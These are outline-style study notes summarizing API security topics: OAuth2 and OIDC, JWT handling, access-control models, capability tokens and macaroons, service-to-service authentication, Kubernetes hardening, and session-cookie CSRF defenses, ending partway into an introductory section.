	• Core Terms \& Roles

		○ AS (Authorization Server): Authenticates users, issues tokens.

		○ RS (Resource Server / your API): Consumes tokens.

		○ Client: The app requesting access (public or confidential).

		○ RO (Resource Owner): The end user.

		○ Access token: Grants API access.

		○ Refresh token: Lets a client get new access tokens without user re-auth.

		○ Scope(s): String labels that limit what the token can do.

	• Scopes vs permissions

		○ Scopes (DAC): What a user consents to delegate to a client (“post\_message”, “read\_messages”). Client-facing, coarse to fine as needed.

		○ Permissions (MAC or DAC): Admin-designed rights to specific resources/objects (ACLs, roles). Scopes say which operations may be called; permissions also constrain which objects.

	• Client types

		○ Public: Browser SPA, mobile, desktop—can’t keep a secret.

		○ Confidential: Server-side—can authenticate to AS (client secret/JWT/TLS).

	• Grant types (what to use)

		○ Use: Authorization Code + PKCE (for web, SPA, mobile, desktop).

		○ Avoid: Implicit (token leaks) and ROPC (shares password with app).

		○ Others: Client Credentials (service→service), Device flow (no UI).

	• Authorization Code + PKCE flow (essentials)

		○ Client redirects to /authorize with scope, state, PKCE code\_challenge.

		○ AS authenticates user, shows consent, returns code (+ state).

		○ Client posts code (+ code\_verifier) to /token → gets access token (and often refresh token).

		○ Use Authorization: Bearer <token> to call the API.

		○ PKCE: Always on. Stops code interception by requiring a matching code\_verifier.

	• Redirect URIs (security)

		○ Prefer claimed HTTPS redirects (App/Universal Links).

		○ Private URI schemes are weaker (can be hijacked).

		○ CLI/desktop: use loopback http://127.0.0.1:<random>.

	• Validating access tokens (at the API)

		○ Two mainstream options:

			§ Token Introspection (RFC 7662): RS POSTs token to AS /introspect → gets active, sub, scope, exp, etc.

				□ Pros: central control/revocation; RS doesn’t need keys.

				□ Cons: network hop per check (cache carefully).

			§ JWT access tokens: RS validates locally.

				□ Prefer public-key signatures (AS signs with private key; RS verifies with public key from JWK Set). Enforce expected issuer, audience, alg.

				□ Handle scope claim variants (string vs array).

				□ Pros: no network call; scalable. Cons: key rotation/JWK fetching; larger tokens.

	• Crypto choices \& TLS hardening

		○ Signature algs (JWS): Prefer EdDSA (Ed25519) if supported; else ES256; avoid RSA PKCS#1 v1.5 if possible (prefer RSASSA-PSS).

		○ Encrypted tokens (JWE): Only when you must hide claims from clients; prefer ECDH-ES over RSA-OAEP; never RSA1\_5.

		○ TLS to AS: Pin trust to your org CA, allow only TLS 1.2/1.3 and modern ciphers.

	• Refresh tokens

		○ Let you issue short-lived access tokens.

		○ Client uses /token with grant\_type=refresh\_token.

		○ AS can rotate refresh tokens to detect theft.

	• Revocation

		○ OAuth revocation endpoint: Only the client that owns the token can revoke.

		○ For RS-side checks, rely on introspection (or short TTL + refresh).

	• Single sign-on (SSO)

		○ Centralize auth at the AS; browser session at AS enables seamless re-auth across clients.

	• OpenID Connect (OIDC)

		○ Adds identity to OAuth:

			§ ID token (JWT): who the user is + how/when they authenticated (e.g., auth\_time, amr, acr, nonce).

			§ UserInfo endpoint: detailed profile claims via access token.

		○ Do not use ID tokens for API access (not scoped; wrong audience). Use access tokens for authorization; ID tokens for identity/assurance.

		○ If a client passes an ID token to your API, accept it only alongside a valid access token and verify issuer, audience, azp, subject match.

	• Design \& implementation tips

		○ Require a scope to obtain scoped tokens (avoid privilege escalation).

		○ Pre-register redirect URIs; validate state; always use PKCE.

		○ Enforce audience on tokens so a token for API A can’t be replayed to API B.

		○ Handle username mapping (sub/username) between AS and your user store (LDAP/DB).

		○ Avoid compression of encrypted content unless you understand the side-channel risks.

	• Common pitfalls to avoid

		○ Using implicit or ROPC for third-party apps.

		○ Trusting JWT alg/jku/jwk headers blindly.

		○ Treating an ID token like an access token.

		○ No revocation plan (or caching introspection too long).

		○ Weak redirect URI strategy (open redirects, unclaimed schemes).

#### Modern Token-Based Authentication



Main Idea

	• Move beyond same-site session cookies to a modern, cross-origin, token-based setup:

		○ enable CORS correctly,

		○ send tokens with the Bearer HTTP scheme,

		○ store tokens client-side with Web Storage (not cookies),

		○ and harden server-side token storage (DB hashing + HMAC, cleanup, least privilege).

	• Key concepts (what \& why)

		○ CORS: lets specific cross-origin requests through SOP using preflights (OPTIONS).

			§ Preflight sends Origin, Access-Control-Request-Method/Headers.

			§ Server echoes allowed values via:

				• Access-Control-Allow-Origin (single origin; add Vary: Origin)

				• Access-Control-Allow-Methods, …-Headers, optional …-Max-Age

				• Access-Control-Allow-Credentials: true when you want cookies or TLS client certs.

			§ Cookies + CORS: must send …-Allow-Credentials: true on both preflight and actual response and client must set fetch(..., { credentials: 'include' }).

			§ SameSite vs CORS: SameSite cookies don’t ride on true cross-site requests; future favors non-cookie tokens for cross-origin.

		○ Tokens without cookies

			§ Server-side: DatabaseTokenStore with token\_id, user\_id, expiry, attributes (JSON).

				• Generate IDs with SecureRandom (e.g., 20 bytes → Base64url ≈ 160 bits).

				• Expiry deletion task + index on expiry.

			§ Wire format: use Authorization: Bearer <token>; advertise with WWW-Authenticate: Bearer (e.g., error="invalid\_token" when expired).

			§ Client-side: store token in localStorage (persists across tabs/restarts) and send it in the Authorization header. No credentials: 'include'.

				• Remove CSRF header/logic when not using cookies.

		○ Security hardening

			§ CSRF goes away with non-cookie tokens (browser no longer auto-attaches creds).

			§ XSS risk increases (Web Storage is JS-accessible). Prioritize XSS defenses:

				• strict output encoding, CSP, consider Trusted Types.

			§ Protect tokens at rest:

				• Hash tokens before DB write (e.g., SHA-256); compare using constant-time equality.

				• Add HMAC-SHA-256 tag to tokens issued to clients: tokenId.tag.

					® Validate tag (constant-time) before DB lookup; strip tag, then look up.

					® Store HMAC key in a keystore (e.g., PKCS#12), load on startup; don’t hard-code or keep in the same DB.

				• DB hygiene:

					® Least-privilege accounts; split duties (e.g., CQRS: different users for queries vs destructive ops).

					® Consider row-level security where supported.

					® Encrypt backups; application-level encryption for highly sensitive attributes is complex—use with care.

	• Implementation checklist

		○ CORS filter

			§ Echo exact origin; add Vary: Origin.

			§ Allow needed methods/headers (e.g., Content-Type, Authorization).

			§ Only use …-Allow-Credentials: true if you truly need cookies; otherwise omit it.

		○ Auth flow

			§ POST /sessions → create random token, store in DB, return token.

			§ Client saves token to localStorage; sends Authorization: Bearer … on API calls.

			§ DELETE /sessions revokes (delete by id/hash).

			§ Return WWW-Authenticate: Bearer on 401s; invalid\_token when expired.

		○ Token store hardening

			§ Generate with SecureRandom.

			§ Store hash(tokenId) in DB; schedule expired token cleanup.

			§ Wrap store with HMAC validator (key from keystore).

	• When to choose what

		○ Same-origin web app: session cookies + SameSite + CSRF defenses (Ch. 4) still great.

		○ Cross-origin web, mobile, desktop, SPAs on other domains: Bearer + Web Storage + DB tokens with CORS; no cookies.

	• Smart defaults

		○ Bearer everywhere; Base64url for ids; SecureRandom only.

		○ No state-changing GETs.

		○ Constant-time comparisons (MessageDigest.isEqual).

		○ Keep CORS tight (allow specific origins) unless you truly need public access.

#### Self-Contained Tokens and JWTs



Main Idea

	• Scale beyond DB-backed sessions by making self-contained tokens (client holds the state) and securing them with integrity (HMAC/signatures) and, when needed, confidentiality (encryption). Use JWT/JOSE carefully, and add a revocation strategy since state lives client-side.

	• Key Concepts

		○ Self-contained (stateless) tokens

			§ Token == encoded claims (e.g., JSON) + protection.

			§ Pros: fewer DB hits, easy horizontal scale.

			§ Cons: revocation is hard; token contents leak unless encrypted.

		○ Integrity: HMAC / JWS

			§ Wrap your JSON token with HMAC-SHA-256 or sign as a JWS so it can’t be forged/modified.

			§ Validate with constant-time comparison; advertise failures via WWW-Authenticate only as needed.

		○ Confidentiality: Authenticated Encryption

			§ Use AEAD (e.g., AES-GCM or AES-CBC + HMAC (EtM)) or high-level libs (NaCl/SecretBox, Tink).

			§ Encrypt-then-MAC (or a single AEAD) → prevents tampering + chosen-ciphertext tricks.

			§ IV/nonce must be unique/unpredictable (generate via CSPRNG).

		○ JWT / JOSE essentials

			§ Structure (JWS Compact): base64url(header).base64url(payload).base64url(tag)

			§ Common claims:

				□ sub (subject), exp (expiry), iss (issuer), aud (audience), iat (issued at), nbf (not before), jti (JWT ID).

			§ Header pitfalls:

				□ Don’t trust alg from the token; bind algorithm to the key (key-driven agility).

				□ Use kid to look up server-held keys; avoid jwk/jku (key injection/SSRF risk).

			§ Encrypted JWTs (JWE): header + (optional) encrypted key + IV + ciphertext + tag. Prefer direct symmetric encryption (alg: "dir") with AEAD.

		○ Libraries, not hand-rolls

			§ Use a mature JOSE/JWT lib (e.g., Nimbus). Avoid DIY crypto/composition errors.

		○ Key management

			§ Separate keys by purpose (HMAC vs encryption). Store in a keystore, not code/DB. Support key rotation (kid).

		○ Revocation with stateless tokens

			§ Options:

				□ Allowlist in DB (only listed jti are valid).

				□ Blocklist of revoked jti until exp.

				□ Attribute-based invalidation (e.g., “all tokens for user X issued before T”).

				□ Short-lived access tokens + (later) refresh tokens (OAuth2 pattern).

			§ Hybrid approach (recommended default): JWT for integrity/confidentiality plus DB allowlist for revocation. Lets you skip DB for low-risk reads, check DB for sensitive ops.

		○ API design safety with types

			§ Use marker interfaces (e.g., ConfidentialTokenStore, AuthenticatedTokenStore, SecureTokenStore) so insecure combinations don’t compile.

		○ Compression caution

			§ Avoid JWE zip unless you truly need it (BREACH/CRIME-style side channels).

	• Quick implementation blueprint

		○ Create claims (sub, exp, optional iss, aud, jti, custom attrs).

		○ Protect:

			§ Integrity only → JWS (HS256) or HMAC wrapper.

			§ Integrity + confidentiality → JWE (e.g., A128CBC-HS256) or SecretBox.

		○ Keying: load from PKCS#12 keystore; bind alg to key; expose kid.

		○ Validate: parse, verify signature/tag, check aud, exp/nbf, then consume claims.

		○ Revoke: on logout/compromise, remove jti from allowlist (or add to blocklist).

	• Threats \& mitigations (STRIDE map)

		○ Spoofing/Tampering → HMAC/JWS/JWE (authenticated).

		○ Information disclosure → encrypt (JWE/SecretBox).

		○ Replay → short exp, enforce TLS, use jti tracking if needed.

		○ Config abuse → ignore alg header; never accept jwk/jku from tokens.

		○ Oracle/side channels → constant-time compares; generic error messages; be careful with CBC and compression.

	• When to choose what

		○ Small/medium scale, easy revocation → DB tokens (hashed + HMAC).

		○ High scale, cross-service → JWT (signed or encrypted) + allowlist.

		○ Simple single-service and you control both ends → NaCl/SecretBox tokens.

	• Common mistakes to avoid

		○ Trusting alg or fetching keys from jku.

		○ Using encryption without authentication.

		○ Reusing nonces/IVs.

		○ No revocation plan for stateless tokens.

		○ Hard-coding keys or storing them in the same DB as tokens.



#### Identity-Based Access Control



Main Idea

	• ACLs don’t scale. Move to identity-based access control (IBAC) patterns that organize “who can do what” using groups, roles (RBAC), and—when rules must be contextual and dynamic—attributes (ABAC). Centralize and automate policy where helpful, but keep it testable and manageable.

	• Key Concepts

		○ IBAC: Authorize based on who the authenticated user is.

		○ Groups: Many-to-many user collections (can be nested). Assigning perms to groups reduces ACL bloat and keeps members consistent.

			§ LDAP groups:

				• Static: groupOfNames / groupOfUniqueNames (explicit member).

				• Dynamic: groupOfURLs (membership via queries).

				• Virtual static: server-computed.

				• Lookups: search by DN, avoid LDAP injection (parametrized filters), cache results; some servers expose isMemberOf.

			§ RBAC: Map roles → permissions, then users → roles (not users → permissions).

				• Benefits: simpler reviews, separation of duties, app-specific roles, easier change control.

				• Sessions (NIST RBAC): a user activates only a subset of their roles → least privilege.

				• Static roles: stored assignments per scope/realm (e.g., per space).

				• Dynamic roles: time/shift-based or rule-based activation; less standardized; constraints (e.g., mutually exclusive roles) support separation of duties.

			§ RBAC implementation patterns:

				• Code annotations (e.g., @RolesAllowed).

				• Data-driven mapping (tables: role\_permissions, user\_roles)—transparent and admin-friendly.

				• Typical roles example: owner (rwd), moderator (rd), member (rw), observer (r).

			§ ABAC: Decide per request using four attribute sets:

				• Subject (user, groups, auth method, auth time)

				• Resource (object/URI, labels)

				• Action (HTTP method/operation)

				• Environment (time, IP, location, risk)

Combine rule outcomes (e.g., default-permit with deny overrides, or safer default-deny).

			§ Policy engines \& centralization:

				• Rule engines (e.g., Drools) or policy agents/gateways (e.g., OPA) to evaluate ABAC rules.

				• XACML architecture:

					® PEP (enforces), PDP (decides), PIP (fetches attributes), PAP (admin UI).

					® Enables central policy with distributed enforcement.

	• Design guidance (how)

		○ Layering strategy: Start with groups (org-level), organize API permissions with RBAC (app-specific), then ABAC for contextual constraints (time/location/risk)—defense in depth.

		○ Keep auth vs. authz layered: Gather identity/group claims during authentication; authorization logic consumes those attributes—avoids tight DB coupling and eases swapping in LDAP/OIDC.

		○ Data modeling tips:

			§ Use user\_roles + role\_permissions; cache per-request resolved permissions.

			§ Scope roles to a realm (e.g., a space/project).

		○ Rule combining: Choose and document defaults (default-deny is safest; if layering over RBAC, default-permit with deny-overrides can work).

		○ Operational best practices:

			§ Version control for policies; code review changes.

			§ Automated tests for endpoints and policy rules.

			§ Monitor performance of policy evaluation; cache derived attributes prudently.

	• Common pitfalls

		○ Assigning permissions directly to individual users (hard to audit).

		○ Mixing group lookups into every authorization query (breaks layering; harder to swap identity backends).

		○ Over-complex ABAC policies (hard to predict/maintain; brittle to data shape changes).

		○ Centralization that slows iteration → lingering overly broad access (least-privilege erosion).

	• Quick contrasts

		○ Groups vs Roles: Groups organize people (often org-wide). Roles organize permissions (app-specific). RBAC usually forbids user-direct perms; groups often don’t.

		○ RBAC vs ABAC: RBAC = stable, comprehensible entitlements; ABAC = contextual, fine-grained, dynamic control.

		



#### Capability-Based Security And Macaroons



Main Idea

	• Sometimes identity-based access control (IBAC/RBAC/ABAC) clashes with how people actually share things. Capability-based security fixes this by granting access with unforgeable, least-privilege references to specific resources (often as URLs). You can further harden capabilities with macaroons, which let anyone add verifiable, limiting caveats to a token.

	• Key Concepts

		○ Capability (cap): An unforgeable reference + the exact permissions to a single resource. Possession ⇒ authority (no ambient identity lookup).

		○ POLA, not ambient authority: Capabilities naturally enforce the Principle of Least Authority and avoid confused deputy bugs (e.g., CSRF) that arise from ambient credentials like cookies or IP checks.

		○ Capability URI (a.k.a. cap URL): A REST-friendly cap encoded in a URL.

			§ Token placement options \& trade-offs

				□ Path / query: simplest; but can leak via logs, Referer, history.

				□ Fragment (#…)/userinfo: not sent to server/Referer; safer for browsers but needs client JS to extract \& resend.

			§ HATEOAS with capabilities: Clients shouldn’t mint their own URIs. Server returns links that are themselves new capabilities (e.g., “messages” link from a “space” cap). This preserves POLA and keeps the client decoupled.

		○ Combining identity + capabilities:

			§ Auth (cookie/OIDC) proves who for audit/accountability.

			§ Capability proves may do what for this resource.

			§ Binding a cap to a user (store username in token \& require cookie match) thwarts CSRF and limits damage if a cap leaks; then you can drop a separate anti-CSRF token.

			§ To still share, add an endpoint that derives a new, possibly reduced-permission cap for another user.

		○ Macaroons: Capability tokens that support caveats (restrictions) anyone can append without server keys; integrity enforced via chained HMAC tags.

			§ First-party caveats: Checked locally by the API (e.g., time < ..., method = GET, since > ...). Great for contextual caveats added just before use to narrow risk (short time, specific method/URI).

			§ Third-party caveats: Require a discharge macaroon from an external service (e.g., “user is employee”, “transaction approved”). Enables decentralized, privacy-preserving authorization.

			§ Verification: API validates HMAC chain, then enforces each caveat with registered verifiers.

	• Practical patterns (Natter examples)

		○ Create caps: Use a secure token store; put resource path and perms in token attrs; return cap URIs (often multiple: rwd/rw/r).

		○ Authorize requests: Replace role lookups with a filter that reads the capability token, checks it matches the requested path, and applies perms.

		○ Linking flow: Responses include further cap links (HATEOAS) to subresources (e.g., /spaces/{id}/messages), preserving or reducing perms.

		○ Browser clients (web-keys): Put token in fragment; load a small JS page that extracts #token and re-sends it as a query param to the API. Beware redirects (fragments copy unless you supply a new one).

		○ Revocation/volume: Long-lived caps can bloat storage; mitigate with self-contained tokens (e.g., JWT) or by reusing existing equivalent caps; keep most caps short-lived.

	• Why this matters

		○ Security: Eliminates ambient authority paths for confused-deputy abuse; per-resource granularity makes over-privilege rarer.

		○ Usability: Matches how users share (“send a link”) while remaining safe.

		○ Composability: Macaroons let clients locally narrow tokens; third-party caveats enable policy checks without tight coupling.

	• Gotchas \& guidance

		○ Don’t leak caps (avoid logging full URLs; set strict Referrer-Policy; prefer fragment for browser-visible links).

		○ Clients can’t fabricate caps—you must return links.

		○ If you bind caps to users, you lose easy link-sharing; provide a server-mediated share/derive flow.

		○ Caveats must only restrict; never grant extra authority based on caveat claims.

		○ Test and version policy/caveat verifiers; treat tokens like secrets.

	• Quick contrasts

		○ Auth token vs Capability:

			§ Auth token ⇒ who you are, broad scope, short-lived.

			§ Capability ⇒ exact resource+perms, shareable, can be longer-lived.

		○ RBAC/ABAC vs Caps:

			§ RBAC/ABAC: identity-centric; good for broad policy \& org controls.

			§ Caps: object-centric; perfect for fine-grained, ad-hoc sharing; pair nicely with identity for audit.



#### Securing Service-To-Service APIs



Main Idea

	• How to authenticate and harden service-to-service API calls. It compares options (API keys, OAuth2 variants, JWT bearer, mutual TLS), explains proof-of-possession with certificate-bound tokens, and shows how to manage/rotate secrets (Kubernetes secrets, vaults/KMS, short-lived tokens, HKDF). It ends with ways to pass user context safely across microservices to avoid confused-deputy problems (phantom tokens, token exchange, macaroons).

	• Key Concepts

		○ API key / JWT bearer

			§ A long-lived bearer token that identifies a client app/org (not a user). Easy to issue/use; hard to revoke; anyone who steals it can use it until expiry. JWTs signed by a portal/AS make multi-API validation easy (public key verify) but are still bearer tokens.

		○ OAuth2 Client Credentials Grant

			§ Client gets an access token as itself (no user). Works with your existing AS, scopes, introspection \& revocation. Typically no refresh token (just ask again).

		○ Service account

			§ A “user-like” account for services, stored with users so APIs can do normal user lookups/roles. Commonly authenticated with non-interactive flows; ROPC works but is being deprecated—prefer stronger methods.

		○ JWT Bearer Grant (RFC 7523)

			§ Client proves identity or acts for a (service) account by presenting a signed JWT assertion. Pros: no long-lived shared secret, short expiry, public key distribution via JWK Set URL for easy rotation.

		○ Mutual TLS (mTLS) \& client certificates (RFC 8705)

			§ TLS on both sides: server and client authenticate with certs. Can be used to authenticate OAuth clients and to issue certificate-bound access tokens (see below). In Kubernetes:

				□ NGINX Ingress: request/verify client cert; forwards details via headers (e.g., ssl-client-verify, ssl-client-cert).

				□ Service mesh (e.g., Istio): does mTLS transparently between pods; forwards identity via X-Forwarded-Client-Cert (includes SANs/SPIFFE IDs). Useful to authenticate services without managing your own certs per service.

		○ Certificate-bound access tokens (PoP tokens)

			§ AS binds the token to the client cert (hash in cnf: { "x5t#S256": ... }). API only accepts the token over a TLS connection using the same cert. Stops token replay if stolen. API just compares the hash; doesn’t need full PKI validation.

		○ Secrets management

			§ Kubernetes Secrets: mount as files or env vars (prefer files). Easy but weaker: etcd needs at-rest encryption; anyone who can run a pod in the namespace can read them.

			§ Secret vaults / KMS: central encrypted storage, audit, fine-grained access, short-lived dynamic creds, crypto operations via service (e.g., PKCS#11). Use envelope encryption (DEK + KEK in KMS).

			§ Avoid long-lived secrets on disk: inject short-lived JWTs or one-time tokens into pods via a controller (separate, locked-down namespace) so pods exchange them for real access/refresh tokens at startup.

		○ Key derivation (HKDF)

			§ Derive many purpose-specific keys from one high-entropy master key using HKDF-Expand(context). Reduces number of stored secrets; supports automatic rotation by changing context (e.g., include date). (Don’t reuse the same key for multiple purposes.)

		○ Confused deputy \& propagating user context

			§ Passing only the service’s identity can let it be abused to perform privileged actions.

			§ Phantom token pattern: gateway introspects a long-lived opaque token and swaps it for a short-lived signed JWT tailored to each backend—fast local verification, least-privilege scopes/audience, easy revocation at the edge.

			§ OAuth2 Token Exchange (RFC 8693): standard way to trade one token for another, adding an act claim to show “service acting for user.” Better across trust boundaries; heavier (extra AS roundtrip).

			§ Macaroons: capability-style tokens where each hop can add caveats (time/resource/user). Efficient local restriction without AS calls.

	• Practical trade-offs \& guidance

		○ Choosing a client auth method

			§ Simple \& external partners: API keys/JWT bearer (but plan revocation, narrow scopes, strict audiences, short expiry).

			§ You already run OAuth2: Client Credentials (introspection + revocation).

			§ Need user-like roles/central user store: Service accounts (avoid ROPC; prefer JWT bearer or mTLS).

			§ Avoid shared secrets/enable rotation: JWT bearer grant with JWKs.

			§ Strongest transport-level auth / PoP tokens: mTLS, optionally with certificate-bound tokens.

		○ Inside a cluster

			§ Prefer service mesh mTLS + forwarded identity headers (SPIFFE) to authenticate services.

			§ If tokens must be used, consider certificate-bound tokens to prevent replay.

		○ Secrets

			§ Prefer vault/KMS over raw K8s secrets; if you must use K8s secrets: encrypt etcd at rest, mount as files, lock down namespaces/RBAC, never check secrets into git.

			§ Use short-lived bootstrap tokens + controller injection; rotate aggressively.

			§ Use HKDF to derive per-purpose keys and avoid key sprawl.

		○ Passing user context

			§ Within one trust boundary: phantom tokens for speed + least privilege.

			§ Across orgs/boundaries: token exchange (clear delegation via act).

			§ Alternative: macaroons when you want hop-by-hop, local capability scoping.

		○ Gotchas (security pitfalls to avoid)

			§ Don’t mix up user vs service tokens—APIs must be able to tell which they are.

			§ Bearer anything (API key/JWT) can be replayed if stolen—keep expirations short; set aud, iss, jti; prefer PoP (cert-bound).

			§ Header spoofing risk: ensure ingress strips/sets auth headers (ssl-client-verify, etc.), ideally with randomized header names or trusted hop checks.

			§ ROPC is legacy; avoid for users and minimize for service accounts.

			§ K8s secrets aren’t encryption; enable etcd encryption (prefer KMS), and beware file exposure/path traversal vulns.

			§ Public key rotation: publish JWKs and rotate with overlapping keys.

		○ Mini-glossary

			§ Client assertion: a signed JWT used to authenticate a client to the token endpoint.

			§ JWK Set: JSON document with one or more public keys for validation/rotation.

			§ cnf / x5t#S256: confirmation key claim holding the SHA-256 thumbprint of the client cert.

			§ SPIFFE ID: standardized URI naming a workload (trust domain + path).

			§ Envelope encryption: data encrypted with a local DEK; DEK encrypted by a KEK in KMS.

			§ Phantom token: short-lived JWT minted by a gateway after introspection.

			§ Token exchange: RFC 8693 flow to swap tokens and add act (delegation chain).

			§ HKDF-Expand: derive new keys from a master HMAC key using a context string.

		○ Quick decision helper

			§ Need revocation + central control? Opaque token + introspection (or phantom tokens behind gateway).

			§ Need zero shared secrets + rotation? JWT bearer grant with JWKs or mTLS client auth.

			§ Worried about token theft? Certificate-bound tokens (PoP).

			§ Lots of services? Mesh mTLS with identity headers + least-privilege scopes.

			§ Secrets everywhere? Vault/KMS + short-lived bootstrap creds + HKDF for per-purpose keys.

			§ User context across hops? Phantom tokens (internal) or Token Exchange (cross-boundary).





#### Microservices APIs in Kubernetes



Main Idea

	• How to run and secure microservice APIs on Kubernetes: package each service in hardened containers, wire them together with Services, secure traffic with a service mesh (mTLS), restrict east–west traffic with NetworkPolicies, and expose the app safely to the outside world through an ingress—all while avoiding pitfalls like SSRF and DNS rebinding.

	• Key Concepts

		○ Microservice: independently deployed service speaking to others via APIs.

		○ Node / Pod / Container: node = VM/host; pod = one-or-more containers; container = one process (typical) + its FS/network view.

		○ Service: stable virtual IP/DNS that load-balances to pods.

		○ Namespace: logical isolation boundary and policy scope.

		○ Privilege separation: put risky work in its own (less-privileged) service.

		○ Ingress controller: cluster edge reverse proxy / LB (TLS termination, routing, rate limit, logging).

		○ Service mesh (Linkerd/Istio): sidecar proxies that auto-TLS (mTLS), observe, and control service-to-service traffic.

		○ NetworkPolicy: allowlist rules for pod ingress/egress inside the cluster.

		○ Zero trust: don’t trust “internal”; authenticate every call.

	• Container security (what “good” looks like)

		○ Use minimal base images (e.g., distroless, Alpine) + multi-stage builds.

		○ Run as non-root (runAsNonRoot: true), no privilege escalation, read-only root FS, drop all Linux capabilities.

		○ Prefer one process per container; use init for one-time setup and sidecars for cross-cutting (e.g., mesh proxy).

	• Kubernetes wiring (Natter example)

		○ Separate deployments/services for API, DB (H2), link-preview.

		○ Internal discovery via Service DNS (e.g., natter-link-preview-service:4567).

		○ Expose externally with Service type NodePort (dev) or, preferably, Ingress (prod).

	• Securing service-to-service traffic

		○ Deploy Linkerd, annotate namespace for proxy injection.

		○ Mesh upgrades HTTP to mTLS automatically between pods; rotate certs; identities are service-scoped.

		○ Note: some non-HTTP protocols may need manual TLS (Linkerd advancing here).

	• Limiting lateral movement

		○ Write NetworkPolicies:

			• Ingress: who can talk to me (labels + ports).

			• Egress: where I’m allowed to call (destinations + ports).

		○ Remember: policies are allowlists; combine to form the union of allowed flows.

	• Securing the cluster edge

		○ Ingress controller (NGINX) handles:

			• TLS termination (K8s Secret with cert/key; cert-manager in prod)

			• Routing (Host/path rules), rate limiting, audit logging.

		○ With a mesh, rewrite upstream Host so ingress→backend also rides mTLS.

	• Defending against common attacks

		○ SSRF (server-side request forgery)

			• Best: strict allowlist of URLs/hosts.

			• If allowlist infeasible: block internal/loopback/link-local/multicast/wildcard IPs (v4/v6), and validate every redirect hop (disable auto-follow; cap redirect depth).

			• Prefer zero trust internally—internal services require auth too.

		○ DNS rebinding

			• Validate Host header against an expected set (or proxy config).

			• Use TLS end-to-end so cert CN/SAN must match hostname.

			• Network/DNS layer: block answers that resolve public names to private IPs.

		○ Practical build/deploy notes

			• Build containers with Jib (no Dockerfile) or hand-rolled Dockerfile using distroless.

			• Keep secrets out of images; use Kubernetes Secrets (Chapter 11).

			• Make pods reproducible; keep YAML under version control.

	• Why this matters

		○ Confidentiality \& integrity of inter-service calls (mTLS) + least privilege at container and network layers = strong defense-in-depth.

		○ Clear blast-radius boundaries (privilege separation + policies) make incidents containable.

		○ Ingress centralizes edge security so teams don’t re-solve TLS/rate limiting.

	• Quick checklists

		○ Harden a deployment

			• Distroless/minimal base; multi-stage build

			• runAsNonRoot, allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, drop caps

			• Expose only needed ports

		○ Enable secure comms

			• Annotate namespace for mesh injection

			• Verify mTLS via linkerd tap (or mesh dashboard)

		○ Constrain the network

			• NetworkPolicies for DB (ingress from API only; no egress)

			• Policies for each service pair (ingress/egress)

		○ Protect the edge

			• Ingress TLS with real certs; rate limit + logs

			• If meshed, set upstream Host rewrite for mTLS to backends

		○ Defend link-preview (and similar fetchers)

			• Prefer allowlist; else block private IPs (v4/v6)

			• Validate each redirect; cap to N hops

			• Validate Host header; use TLS; timeouts; small fetch windows





#### Session Cookie Authentication



Main Idea

	• Move from “send username+password on every request” (HTTP Basic) to token-based auth for browser clients—specifically session cookies—and harden them against CSRF and session fixation. Build a tiny same-origin UI to show how browsers, cookies, and headers actually behave.

	• Key concepts (what, why, how)

		○ Why not Basic in browsers

			§ Password sent on every call; costly (password hashing each time) and risky if any endpoint leaks it.

			§ Ugly browser prompts; hard to “log out.”

		○ Token-based auth

			§ Login once → issue short-lived token; present token on subsequent calls until expiry.

			§ Implement via a TokenStore abstraction (create/read/revoke) so backends can change.

		○ Session cookies as the token

			§ Use Spark’s session (JSESSIONID) as the server-side token; store user, expiry, attributes on the session.

			§ Cookie security attributes: Secure, HttpOnly, SameSite (lax/strict), plus Path, Domain, Max-Age/Expires.

			§ Prefer \_\_Host- or \_\_Secure- cookie name prefixes for built-in safeguards.

		○ Same-origin UI \& SOP

			§ Serve HTML/JS from the same origin as the API to avoid CORS issues; use Spark.staticFiles.location("/public").

			§ The browser’s same-origin policy governs what JS can request/read.

		○ Session fixation (must fix on login)

			§ If a preexisting session is reused at login, an attacker can preseed a victim’s session ID.

			§ Mitigation: on successful auth, invalidate any existing session and create a fresh session.

		○ Authenticating requests with the cookie

			§ A request is treated as authenticated if a valid, unexpired session exists; set request.attribute("subject") so downstream filters work.

		○ CSRF: the big risk with cookies

			§ Because browsers auto-attach cookies cross-site, other origins can make state-changing calls “as you.”

			§ Defenses:

				• SameSite cookies (lax/strict) — good baseline for first-party apps.

				• Double-submit token (hash-based) — robust defense:

					• Server returns a CSRF token that is SHA-256(sessionID), Base64url-encoded.

					• Client sends it on each write request as X-CSRF-Token header.

					• Server recomputes SHA-256(sessionID) and compares with constant-time equality; reject if absent/mismatch.

					• Store CSRF token in a non-HttpOnly cookie (or other client storage) so JS can read and echo it.

				• Suppressing Basic auth popups

					• For 401s in a JS app, omit WWW-Authenticate so the browser doesn’t show the default dialog; app redirects to /login.html.

				• Logout

					• Expose DELETE /sessions; read CSRF token from header; invalidate the server session (and thus the cookie). Avoid putting tokens in URLs.

	• Implementation blueprint (in order)

		○ Serve UI from same origin; simple fetch-based forms.

		○ Add /sessions POST (login): Basic-auth -> create fresh session -> return CSRF token (hash of session ID).

		○ Add CookieTokenStore; on create: invalidate old session; set attributes; return hashed token.

		○ Add validateToken filter: read X-CSRF-Token; if present and not expired, set subject.

		○ Mark sensitive routes to require auth; client JS includes X-CSRF-Token on writes.

		○ Add DELETE /sessions for logout (verify CSRF; invalidate session).

	• Gotchas \& good defaults

		○ Always HTTPS; mark auth cookies Secure; HttpOnly; SameSite=strict (or lax if UX needs link navigation).

		○ Never change server state on GET.

		○ Use constant-time comparison for secrets (e.g., MessageDigest.isEqual).

		○ Avoid Domain on cookies unless necessary; prefer host-only (\_\_Host-…) to resist subdomain issues.

		○ Do not rely solely on “JSON Content-Type” or “custom headers” tricks for CSRF—use real CSRF tokens.

	• When session cookies are a good fit

		○ First-party, same-origin browser apps.

		○ You want automatic cookie handling + browser protections (Secure/HttpOnly/SameSite).

#### What is API Security?



Main Idea

	• APIs are ubiquitous and therefore high-value targets. “API security” = define what must be protected (assets), decide what “secure” means for your context (security goals), understand who/what can threaten those goals (threat model), and apply the right mechanisms (encryption, authN/Z, logging, rate-limits). It’s iterative—not a one-and-done checkbox.

	• What is an API (and Styles)

		○ API = boundary + contract between components; optimized for software consumption (vs a UI for humans).

		○ Styles \& trade-offs

			• RPC/gRPC/SOAP: efficient, tight coupling via stubs.

			• REST(ful): uniform interface, looser coupling, evolvability.

			• GraphQL/SQL-like: few ops, rich query language.

			• Microservices: many internal APIs; security spans service-to-service too.

	• API security in context

		○ Security sits at the intersection of:

			• InfoSec (protect data lifecycle; crypto, access control),

			• NetSec (TLS/HTTPS, firewalls, network posture),

			• AppSec (secure coding, common vulns, secrets handling).

	• Typical deployment stack (where controls live)

